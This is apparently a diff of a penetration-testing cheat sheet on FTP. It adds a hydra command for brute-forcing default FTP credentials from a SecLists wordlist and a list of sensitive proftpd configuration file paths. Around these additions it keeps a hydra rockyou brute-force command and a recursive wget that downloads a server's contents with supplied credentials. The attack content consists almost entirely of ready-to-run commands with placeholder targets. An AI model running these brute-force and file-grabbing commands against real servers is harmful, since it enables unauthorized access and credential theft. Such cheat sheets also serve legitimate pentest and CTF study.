@@ -24,7 +24,15 @@
 
     wget -r ftp://USER:PASSWORD@IP/
 
-### 6) Brute force attack
+### 6) Brute force attack 
 
     hydra -l USERNAME -P /usr/share/wordlists/rockyou.txt IP -t 4 ftp
 
+### 7) Default FTP credentials brute force attack
+
+    hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt IP ftp
+
+### 8) FTP important/sensitive files
+
+    /etc/proftpd/proftpd.conf
+    /etc/proftpd/sql.conf
